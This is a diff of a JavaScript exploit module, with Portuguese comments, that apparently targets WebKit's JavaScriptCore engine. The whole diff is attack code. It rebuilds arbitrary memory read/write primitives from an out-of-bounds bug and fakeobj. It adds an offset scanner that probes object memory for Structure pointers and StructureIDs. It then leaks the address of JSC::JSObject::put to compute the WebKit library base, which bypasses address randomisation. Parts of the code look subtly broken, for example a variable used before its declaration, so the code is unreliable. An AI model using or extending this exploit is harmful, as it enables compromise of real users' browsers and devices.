@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R68 Tentativa de Bypass StructureID)
+// js/script3/testArrayBufferVictimCrash.mjs (v109 - R69 Scanner de Offsets para Structure/Vtable)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Tenta vazar o StructureID (Uint32) do offset 0x0 do JSCell.
-// - Usa um offset PLACEHOLDER para a tabela de Structures (STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE).
-// - Calcula o endereço real da Structure a partir do ID e da tabela.
-// - Prossegue com o vazamento da vfunc::put a partir do endereço real da Structure.
+// - Implementação de um scanner de offsets na Fase 5 para tentar identificar o
+//   verdadeiro local do Structure Pointer/ID ou VTable Pointer dentro do JSCell.
+// - Os offsets JSCell.STRUCTURE_POINTER_OFFSET e STRUCTURE_ID_FLATTENED_OFFSET serão testados por varredura.
+// - A leitura direta do StructureID/Pointer será removida/comentada em favor do scanner inicial.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +16,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R68_BypassStructureID";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v109_R69_OffsetScanner";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -40,7 +40,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Tentativa de Bypass de StructureID ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Scanner de Offsets para Structure/Vtable ---`, "test");
 
     let final_result = {
         success: false,
@@ -113,7 +113,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- Reiniciar TODO o ambiente para a Fase 5 ---
         logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
         
-        // Zera as referências antigas para ajudar na coleta de lixo
         confused_array = null;
         victim_array = null;
         leaker = null;
@@ -121,15 +120,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         fakeobj_func = null;
         arb_read_final_func = null;
         arb_write_final_func = null;
-        await PAUSE_S3(200); // Dar um PAUSE maior para potencial GC
+        await PAUSE_S3(200); 
 
-        // CHAVE: Re-inicializa o ambiente OOB completo
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
         logS3("Ambiente OOB re-inicializado com sucesso.", "good");
 
 
-        // Re-declara e re-inicializa as primitivas para o NOVO ambiente OOB
         confused_array = [13.37]; 
         victim_array = [{ dummy: 0 }]; 
         
@@ -143,13 +140,23 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         
         leaker = { obj_prop: null, val_prop: 0 };
-        arb_read_final_func = (addr) => {
+        arb_read_final_func = (addr, size_bytes = 8) => { // Adicionado size_bytes
             leaker.obj_prop = fakeobj_func(addr);
+            if (size_bytes === 4) {
+                return leaker.val_prop & 0xFFFFFFFF; // Assume que o valor lido como double será truncado para 32-bit
+            }
             return doubleToInt64(leaker.val_prop);
         };
-        arb_write_final_func = (addr, value) => {
+        arb_write_final_func = (addr, value, size_bytes = 8) => { // Adicionado size_bytes
             leaker.obj_prop = fakeobj_func(addr);
-            leaker.val_prop = int64ToDouble(value);
+            if (size_bytes === 4) {
+                // Para 4 bytes, precisamos garantir que apenas os 32 bits mais baixos sejam escritos
+                const current_val = doubleToInt64(leaker.val_prop);
+                const new_low = Number(value) & 0xFFFFFFFF;
+                leaker.val_prop = int64ToDouble(new AdvancedInt64(new_low, current_val.high()));
+            } else {
+                leaker.val_prop = int64ToDouble(value);
+            }
         };
         logS3("Primitivas L/E re-inicializadas com novos objetos (Arrays Literais) e referências no NOVO ambiente OOB.", "good");
 
@@ -174,58 +181,117 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         await PAUSE_S3(250); 
 
-        // NOVO: Etapa 2.1 - Tentar ler o StructureID do offset 0x0
-        const structure_id_ptr = leak_target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET); // Offset 0x0
-        leaker.obj_prop = null; 
-        // Ler 4 bytes para o StructureID
-        const structure_id_val = arb_read_final_func(structure_id_ptr, 4); // <--- Lendo 4 bytes (Uint32)
-        logS3(`[Etapa 2.1] Lendo do endereço ${structure_id_ptr.toString(true)} (JSCell + 0x0) para obter o StructureID...`, "debug");
-        logS3(`[Etapa 2.1] StructureID vazado: ${toHex(structure_id_val)} (decimal: ${structure_id_val})`, "leak");
+        // ============================================================================
+        // NOVO: SCANNER DE OFFSETS
+        // ============================================================================
+        logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do objeto alvo... ---", "subtest");
+        let found_structure_ptr = null;
+        let found_structure_id = null;
+        let found_vtable_ptr = null;
 
-        if (typeof structure_id_val !== 'number' || structure_id_val === 0) { // Validar que não é zero e é um número
-            throw new Error(`FALHA CRÍTICA: StructureID é NULO ou inválido (${toHex(structure_id_val)}). Provavelmente não é um StructureID válido.`);
+        const SCAN_RANGE_START = 0x0; // Começar do início do objeto
+        const SCAN_RANGE_END = 0x100; // Varrer até 0x100 bytes (256 bytes)
+        const SCAN_STEP = 0x8;       // Passos de 8 bytes (QWORD)
+
+        for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
+            const current_scan_addr = leak_target_addr.add(offset);
+            leaker.obj_prop = null; // Limpa antes de cada leitura
+            let val_8_bytes = AdvancedInt64.Zero;
+            try {
+                val_8_bytes = arb_read_final_func(current_scan_addr, 8); // Tenta ler 8 bytes
+                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
+
+                // Tentativa de identificar ponteiro de Structure (apontando para WebKit)
+                // A região do WebKit geralmente começa com 0x7FFF... ou 0x00... em userland.
+                // Um Structure* válido geralmente tem o bit 0 setado em alguns WebKits (tagging).
+                if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
+                    (val_8_bytes.high() >>> 16) === 0x7FFF) { 
+                    
+                    logS3(`    [Scanner] Possível Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
+                    
+                    // Se for 0x8 (STRUCTURE_POINTER_OFFSET), é um forte candidato para Structure*
+                    if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
+                        found_structure_ptr = val_8_bytes;
+                        logS3(`        [Scanner] --> CANDIDATO FORTE: Ponteiro da Structure em ${toHex(offset, 6)}!`, "good");
+                    }
+                    // Se for 0x0 (onde deveria ser o StructureID), mas é um ponteiro, é um problema.
+                    else if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
+                         logS3(`        [Scanner] --> ALERTA: Ponteiro (não ID) encontrado em StructureID offset ${toHex(offset, 6)}.`, "warn");
+                    }
+                    // Pode ser uma vtable pointer, que geralmente está no início da estrutura
+                    else if (offset === 0x0) { // Se o próprio objeto tem uma vtable (ex: C++ base classes)
+                        found_vtable_ptr = val_8_bytes;
+                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do próprio objeto) em ${toHex(offset, 6)}!`, "good");
+                    }
+                }
+
+                // Tentar ler 4 bytes como StructureID (no mesmo offset, ou offsets múltiplos de 4)
+                if (offset % 4 === 0) { // A StructureID pode estar em offsets 0, 4, 8, etc.
+                    leaker.obj_prop = null; 
+                    const val_4_bytes = arb_read_final_func(current_scan_addr, 4); // Tenta ler 4 bytes
+                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { // IDs são pequenos
+                        logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
+                        if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
+                             found_structure_id = val_4_bytes;
+                             logS3(`        [Scanner] --> CANDIDATO FORTE: StructureID em ${toHex(offset, 6)}!`, "good");
+                        }
+                    }
+                }
+
+            } catch (scan_e) {
+                logS3(`    [Scanner] Erro lendo offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
+            }
         }
-        if (structure_id_val > 0x10000) { // StructureIDs geralmente não são tão grandes (24 bits = max 0xFFFFFF)
-             logS3(`[Etapa 2.1] ALERTA: StructureID é unexpectedly large (${toHex(structure_id_val)}). Pode ser um ponteiro.`, "warn");
+        logS3("--- FIM DO SCANNER DE OFFSETS ---", "subtest");
+
+        // Decisão com base no scanner
+        let structure_addr = null;
+        let actual_structure_id = null;
+
+        if (found_structure_ptr && !found_structure_ptr.equals(AdvancedInt64.Zero)) {
+            structure_addr = found_structure_ptr;
+            logS3(`[DECISÃO] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
+        } else if (typeof found_structure_id === 'number' && found_structure_id !== 0) {
+            actual_structure_id = found_structure_id;
+            logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
+            
+            // Se encontrou StructureID, tentar vazar a tabela de estruturas.
+            const webkit_base_candidate_for_struct_table = jsobject_put_addr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"])); 
+            if (webkit_base_candidate_for_struct_table.low() === 0 && webkit_base_candidate_for_struct_table.high() === 0) {
+                 throw new Error("Erro interno: webkit_base_candidate_for_struct_table é nulo para cálculo da tabela.");
+            }
+
+            const structure_table_base_addr = webkit_base_candidate_for_struct_table.add(
+                new AdvancedInt64(JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
+            );
+            logS3(`[Etapa 2.2] Endereço base da Tabela de Estruturas (estimado): ${structure_table_base_addr.toString(true)}`, "info");
+            
+            const structure_entry_offset = new AdvancedInt64(actual_structure_id).multiply(new AdvancedInt64(8)); 
+            const real_structure_ptr_addr = structure_table_base_addr.add(structure_entry_offset);
+            
+            leaker.obj_prop = null; 
+            structure_addr = arb_read_final_func(real_structure_ptr_addr, 8); 
+            logS3(`[Etapa 2.2] Lendo do endereço ${real_structure_ptr_addr.toString(true)} para obter o ponteiro REAL da Estrutura (ID: ${actual_structure_id})...`, "debug");
+            logS3(`[Etapa 2.2] Endereço REAL da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");
+
+            if (structure_addr.equals(value_to_write) || structure_addr.low() === 0 && structure_addr.high() === 0) {
+                throw new Error("FALHA CRÍTICA: Ponteiro REAL da Estrutura (derivado do ID) é NULO/Inválido ou contaminação persistente.");
+            }
+            if (!((structure_addr.high() >>> 16) === 0x7FFF || (structure_addr.high() === 0 && structure_addr.low() !== 0))) { 
+                 logS3(`[Etapa 2.2] ALERTA: high part do REAL Structure Address (derivado do ID) inesperado: ${toHex(structure_addr.high())}`, "warn");
+            }
+
+        } else {
+            // Se o scanner não encontrou nada promissor
+            throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
         }
 
 
-        // 2.2 - Calcular o endereço real da Structure a partir do ID
-        // Primeiro, precisamos do endereço base da WebKit (já obtido implicitamente se chegamos aqui)
-        // e do offset da tabela de estruturas (JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
-        const webkit_base_candidate_for_struct_table = jsobject_put_addr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"])); // Re-calculando provisoriamente para uso interno
-        
-        if (webkit_base_candidate_for_struct_table.low() === 0 && webkit_base_candidate_for_struct_table.high() === 0) {
-             throw new Error("Erro interno: webkit_base_candidate_for_struct_table é nulo.");
-        }
-
-        const structure_table_base_addr = webkit_base_candidate_for_struct_table.add(
-            new AdvancedInt64(JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
-        );
-        logS3(`[Etapa 2.2] Endereço base da Tabela de Estruturas (estimado): ${structure_table_base_addr.toString(true)}`, "info");
-        
-        // Cada entrada na tabela de estruturas é geralmente um ponteiro de 8 bytes (QWORD)
-        const structure_entry_offset = new AdvancedInt64(structure_id_val).multiply(new AdvancedInt64(8)); 
-        const real_structure_ptr_addr = structure_table_base_addr.add(structure_entry_offset);
-        
-        leaker.obj_prop = null; 
-        const structure_addr = arb_read_final_func(real_structure_ptr_addr, 8); // <--- Lendo 8 bytes (QWORD) para o ponteiro real da Structure
-        logS3(`[Etapa 2.2] Lendo do endereço ${real_structure_ptr_addr.toString(true)} para obter o ponteiro real da Estrutura (ID: ${structure_id_val})...`, "debug");
-        logS3(`[Etapa 2.2] Endereço REAL da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");
-
-        // ADICIONADO: Verificação de Contaminação e Validade (para o ponteiro REAL da Structure)
-        if (structure_addr.equals(value_to_write) || structure_addr.low() === 0 && structure_addr.high() === 0) {
-            throw new Error("FALHA CRÍTICA: Ponteiro REAL da Estrutura é NULO/Inválido ou contaminação persistente.");
-        }
-        if (!((structure_addr.high() >>> 16) === 0x7FFF || (structure_addr.high() === 0 && structure_addr.low() !== 0))) { 
-             logS3(`[Etapa 2.2] ALERTA: high part do REAL Structure Address inesperado: ${toHex(structure_addr.high())}`, "warn");
-        }
-
-
-        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura (agora com o endereço REAL)
+        // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
+        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura.
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         leaker.obj_prop = null; 
-        const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr); // <--- Leitura de 8 bytes (padrão)
+        const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr); 
         logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
         logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
         if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
@@ -273,6 +339,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (StructureID Bypass Attempt)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Offset Scanner)' }
     };
 }
